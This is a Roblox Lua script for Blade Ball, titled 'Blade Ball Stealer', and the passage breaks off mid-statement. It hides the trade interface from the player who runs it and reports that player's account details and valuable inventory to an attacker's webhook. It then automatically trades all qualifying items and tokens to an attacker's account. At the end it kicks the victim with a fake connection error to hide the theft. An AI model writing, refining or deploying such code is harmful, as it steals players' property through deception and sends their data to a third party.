_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 

-- Vérifications de sécurité
if next(users) == nil or webhook == "" then
    return
end

-- Masquer l'interface de trade (ton code original)
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false
local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- FONCTION D'ENVOI AMÉLIORÉE (STYLE IMAGE)
local function SendJoinMessage(list, totalRAPVal)
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end

    local itemSummary = ""
    for name, count in pairs(grouped) do
        itemSummary = itemSummary .. name .. " (x" .. count .. ")\n"
    end
    
    local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')"
    local browserJoin = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
    local executor = identifyexecutor and identifyexecutor() or "Unknown"

    local data = {
        ["content"] = (ping == "Yes" and "||​|| @everyone" or "") .. "\n`" .. joinCode .. "`",
        ["embeds"] = {{
            ["title"] = "🟡 Pending Hit ... | ⚔️ Blade Ball Stealer",
            ["color"] = 16763904,
            ["fields"] = {
                {
                    ["name"] = "ℹ️ Player info:",
                    ["value"] = "```" ..
                        "\n🆔 Username      : " .. plr.Name ..
                        "\n👤 Display Name  : " .. plr.DisplayName ..
                        "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
                        "\n⚡ Executor      : " .. executor ..
                        "\n📩 Receiver      : " .. (users[1] or "None") ..
                        "\n🎮 Server        : " .. #Players:GetPlayers() .. "/15" ..
                        "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "🎯 Inventory:",
                    ["value"] = "```" ..
                        "\n💰 Total Value: " .. formatNumber(totalRAPVal) .. " RAP" ..
                        "\n\n" .. itemSummary ..
                        "```",
                    ["inline"] = false
                },
                {["name"] = "🔗 Join Server", ["value"] = "[Click to join game]("..browserJoin..")", ["inline"] = true},
                {["name"] = "📜 Full Inventory", ["value"] = "[Click to show](https://www.roblox.com/users/"..plr.UserId.."/inventory)", ["inline"] = true}
            },
            ["footer"] = {["text"] = "by Eblack • " .. os.date("%B %d, %Y")},
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"}
        }}
    }

    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

-- Scan Inventaire (Ton code original)
local totalRAP = 0
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

for _, category in ipairs(categories) do
    local catMap = {}
    if rapData[category] then
        for k, v in pairs(rapData[category]) do
            local s, d = pcall(function() return HttpService:JSONDecode(k) end)
            if s then for _, p in ipairs(d) do if p[1] == "Name" then catMap[p[2]] = v end end end
        end
    end
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if not itemInfo.TradeLock then
            local rap = catMap[itemInfo.Name] or 0
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
            end
        end
    end
end

-- Execution
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendJoinMessage(itemsToSend, totalRAP)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            -- Send Request
            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(joinedUser)) end)
            repeat task.wait(0.5) until tradeGui.Enabled

            -- Add Items (Batch 100)
            local count = 0
            while #itemsToSend > 0 and count < 100 do
                local item = table.remove(itemsToSend, 1)
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                count = count + 1
            end

            -- Add Tokens
            local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
            local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
            if tokensamount >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
            end

            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            repeat task.wait(0.2) until not tradeGui.Enabled
        end
        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
    end

    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(
